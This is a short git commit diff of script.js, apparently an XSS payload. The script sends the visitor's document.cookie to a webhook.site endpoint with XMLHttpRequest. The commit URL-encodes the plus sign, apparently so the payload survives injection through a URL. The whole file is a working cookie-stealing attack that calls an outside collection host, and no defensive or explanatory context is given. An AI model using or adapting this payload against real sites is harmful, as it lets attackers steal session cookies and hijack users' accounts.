f4edd25a52e82a5d0be63d372316e76fa58ddb0f
JASalgueiro <74070951+JASalgueiro@users.noreply.github.com>
2022-12-16 20:03:09 +0000

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,5 @@
 <script>
     let xhttp = new XMLHttpRequest();
-    xhttp.open('GET', 'https://webhook.site/225ae295-bbd0-4fb7-865d-4e3edef7e5b8?cookie='+document.cookie);
+    xhttp.open('GET', 'https://webhook.site/225ae295-bbd0-4fb7-865d-4e3edef7e5b8?cookie='%2Bdocument.cookie);
     xhttp.send();
 </script>
